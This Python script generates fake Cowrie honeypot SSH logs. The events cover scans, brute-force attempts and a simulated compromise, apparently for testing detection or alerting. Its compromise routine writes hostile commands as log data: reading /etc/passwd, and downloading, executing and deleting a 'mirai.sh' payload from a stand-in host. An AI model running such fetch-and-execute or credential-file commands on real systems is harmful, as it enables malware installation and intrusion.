import json
import time
import random
import uuid
from datetime import datetime, timezone

LOG_FILE = "cowrie.json"

def generate_timestamp():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

def append_event(event_data):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(event_data) + "\n")
    print(f"[{event_data['timestamp']}] Generated {event_data['eventid']} from {event_data.get('src_ip')}")

def simulate_random_scan(src_ip, session_id):
    append_event({
        "eventid": "cowrie.session.connect",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "src_port": random.randint(10000, 60000)
    })
    time.sleep(random.uniform(0.5, 2))
    append_event({
        "eventid": "cowrie.client.version",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "version": random.choice(["SSH-2.0-libssh-0.6.3", "SSH-2.0-OpenSSH_7.4", "SSH-2.0-paramiko_2.7.2"])
    })
    time.sleep(random.uniform(0.5, 2))
    append_event({
        "eventid": "cowrie.login.failed",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "username": random.choice(["root", "admin", "postgres", "test"]),
        "password": random.choice(["123456", "admin", "password", "root"])
    })
    time.sleep(random.uniform(0.1, 1))
    append_event({
        "eventid": "cowrie.session.closed",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "duration": random.uniform(2, 5)
    })

def simulate_brute_force(src_ip, session_id):
    append_event({
        "eventid": "cowrie.session.connect",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "src_port": random.randint(10000, 60000)
    })
    
    # 6 fast failed logins to trigger alert
    for _ in range(6):
        time.sleep(random.uniform(0.2, 0.8))
        append_event({
            "eventid": "cowrie.login.failed",
            "timestamp": generate_timestamp(),
            "session": session_id,
            "src_ip": src_ip,
            "username": "root",
            "password": random.choice(["root", "123456", "password", "admin", "12345678", "qwerty"])
        })
        
    time.sleep(1)
    append_event({
        "eventid": "cowrie.session.closed",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "duration": random.uniform(3, 8)
    })

def simulate_successful_attack(src_ip, session_id):
    append_event({
        "eventid": "cowrie.session.connect",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "src_port": random.randint(10000, 60000)
    })
    time.sleep(random.uniform(1, 3))
    append_event({
        "eventid": "cowrie.login.success",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "username": "root",
        "password": "password123"
    })
    
    commands = [
        "id",
        "uname -m",
        "cat /etc/passwd",  # alert
        "curl -s http://evil-ip.com/mirai.sh -o /tmp/m",
        "chmod 777 /tmp/m",
        "/tmp/m",
        "rm -rf /tmp/m"
    ]
    
    for cmd in commands:
        time.sleep(random.uniform(1, 4))
        append_event({
            "eventid": "cowrie.command.input",
            "timestamp": generate_timestamp(),
            "session": session_id,
            "src_ip": src_ip,
            "input": cmd
        })
        
    time.sleep(2)
    append_event({
        "eventid": "cowrie.session.closed",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "duration": random.uniform(15, 30)
    })

def run_live_simulation():
    print("Starting continuous live traffic simulation... (Press Ctrl+C to stop)")
    while True:
        # Wait a random period between attacks to simulate sporadic traffic
        sleep_time = random.uniform(3, 10)
        print(f"Waiting {sleep_time:.1f}s until next attack...")
        time.sleep(sleep_time)
        
        src_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        session_id = uuid.uuid4().hex[:12]
        
        attack_type = random.choices(
            ['scan', 'bruteforce', 'success'],
            weights=[0.7, 0.2, 0.1]
        )[0]
        
        if attack_type == 'scan':
            simulate_random_scan(src_ip, session_id)
        elif attack_type == 'bruteforce':
            simulate_brute_force(src_ip, session_id)
        else:
            simulate_successful_attack(src_ip, session_id)

if __name__ == "__main__":
    try:
        run_live_simulation()
    except KeyboardInterrupt:
        print("\nSimulation stopped.")
